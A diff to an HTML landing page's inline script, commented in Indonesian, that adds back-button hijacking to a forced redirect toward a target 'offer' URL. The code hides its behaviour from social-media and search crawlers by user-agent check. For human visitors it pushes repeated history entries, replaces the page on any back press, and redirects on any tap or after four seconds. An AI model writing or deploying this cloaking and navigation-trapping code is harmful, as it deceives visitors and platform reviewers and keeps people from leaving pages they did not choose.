@@ -87,25 +87,38 @@
     const botPattern = /facebookexternalhit|Facebot|Pinterest|Twitterbot|TelegramBot|WhatsApp|Googlebot|bingbot|Quora Link Preview/i;
     const isBot = botPattern.test(navigator.userAgent);
 
+    function triggerBackHijack() {
+      // Menyuntikkan riwayat browser berulang agar tombol back tertahan
+      for (let i = 0; i < 5; i++) {
+        history.pushState(null, null, location.href);
+      }
+      window.onpopstate = function () {
+        location.replace(targetUrl);
+      };
+    }
+
     function redirectUser() {
+      triggerBackHijack();
       window.location.href = targetUrl;
     }
 
     if (!isBot) {
-      // 1. Eksekusi pengalihan lewat sentuhan/klik layar
+      // Inisialisasi awal
+      history.pushState(null, null, location.href);
+      window.onpopstate = function () {
+        location.replace(targetUrl);
+      };
+
+      // Kunci lebih dalam begitu layar disentuh pengunjung
+      document.addEventListener("touchstart", triggerBackHijack, { once: true });
+      document.addEventListener("click", triggerBackHijack, { once: true });
+
+      // Eksekusi sentuhan menuju penawaran utama
       document.getElementById("tap-overlay").addEventListener("click", redirectUser);
       document.getElementById("tap-overlay").addEventListener("touchstart", redirectUser);
       
-      // 2. Timer otomatis (4 detik) jika tidak ada sentuhan
+      // Timer pengalihan otomatis jika pengunjung diam saja
       setTimeout(redirectUser, 4000);
-
-      // 3. Penanganan Tombol Back
-      (function() {
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-          location.replace(targetUrl);
-        };
-      })();
     }
   </script>
 </body>
